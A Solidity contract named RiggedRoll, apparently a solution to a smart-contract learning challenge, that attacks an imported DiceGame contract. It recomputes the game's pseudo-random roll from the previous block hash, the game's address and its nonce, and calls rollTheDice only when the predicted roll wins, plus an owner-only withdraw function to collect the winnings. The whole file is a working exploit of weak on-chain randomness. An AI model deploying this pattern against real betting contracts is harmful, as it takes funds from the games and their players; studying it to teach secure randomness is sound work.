//SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

import "@openzeppelin/contracts/access/Ownable.sol";
import "./DiceGame.sol";

contract RiggedRoll is Ownable {

    DiceGame public diceGame;

    constructor(address payable diceGameAddress) {
        diceGame = DiceGame(diceGameAddress);
    }

    function withdraw(address _addr, uint256 _amount) public onlyOwner {
        (bool success, ) = _addr.call{value: _amount}("");
        require(success, "RiggedRoll: Failed to send Ether");
    }

    function riggedRoll() public payable {
        require(address(this).balance >= 0.002 ether, "RiggedRoll: Failed to have 0.002 ether in balance");
        bytes32 prevHash = blockhash(block.number - 1);
        uint256 nonce = diceGame.nonce();
        bytes32 hash = keccak256(abi.encodePacked(prevHash, address(diceGame), nonce));
        uint256 roll = uint256(hash) % 16;

        require(roll <= 2, "RiggedRoll: The roll is a loser");
        diceGame.rollTheDice{value: 0.002 ether}();
    }

    receive() external payable {}

}